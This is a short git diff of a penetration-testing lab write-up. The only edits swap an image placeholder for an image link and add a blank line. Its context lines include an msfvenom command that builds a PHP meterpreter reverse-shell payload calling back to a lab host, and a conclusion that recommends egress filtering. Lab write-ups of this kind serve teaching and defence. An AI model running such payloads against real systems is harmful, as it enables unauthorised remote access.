@@ -110,7 +110,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.1.16.66 LPORT=9999 -f raw > she
 
 Output confirmed: `Payload size: 34049 bytes`
 
-<!-- INSERT IMAGE -->
+![Metasploit](Penetration-Testing/4.jpg)
 ---
 
 ### Step 2 — Configuring Metasploit Listener
@@ -218,5 +218,6 @@ The web application required no authentication bypass — the file upload functi
 This lab chain illustrates how a single misconfiguration — an unrestricted file upload — can be escalated from initial access all the way to an interactive shell session. Each step built on the last: file upload → RCE → reverse shell. The most impactful defensive control at the network level would have been **egress filtering**: even with RCE achieved, the reverse shell callback to the attacker's machine would have been blocked, containing the breach to read-only command execution rather than an interactive session.
 
 ---
+
 
 *Write-up by Lereko Mohlomi | [LinkedIn](https://www.linkedin.com/in/lereko-mohlomi/)*
